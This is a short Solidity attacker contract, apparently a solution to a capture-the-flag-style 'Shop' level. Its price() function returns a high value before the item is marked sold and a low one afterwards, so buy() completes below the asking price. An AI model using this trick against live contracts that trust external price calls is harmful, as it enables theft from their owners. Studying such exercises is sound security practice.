// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/Shop.sol";

contract ShopAttacker {
    Shop shop;
    uint256 public s_gas;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }

    function attack() public {
        shop.buy();
    }
}
